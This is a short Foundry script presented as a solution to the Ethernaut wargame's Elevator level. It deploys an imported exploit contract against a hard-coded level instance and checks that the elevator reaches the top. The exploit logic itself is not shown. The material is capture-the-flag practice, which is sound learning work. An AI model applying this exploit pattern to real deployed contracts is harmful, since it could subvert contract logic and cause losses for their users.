// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Elevator} from "src/11/Elevator.sol";
import {ElevatorExploit} from "src/11/ElevatorExploit.sol";


contract Exploit is Script {

        address instance = 0x3438a48A2b1d4452113a06A131F8e3Fd568E7A78;
        address hacker = vm.envAddress("PUBLIC_KEY");

        Elevator level = Elevator(instance);        
        
        function run() external {

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

            ElevatorExploit exploit = new ElevatorExploit();
            exploit.run(level);
            assert(level.top());

            vm.stopBroadcast();
    }
}
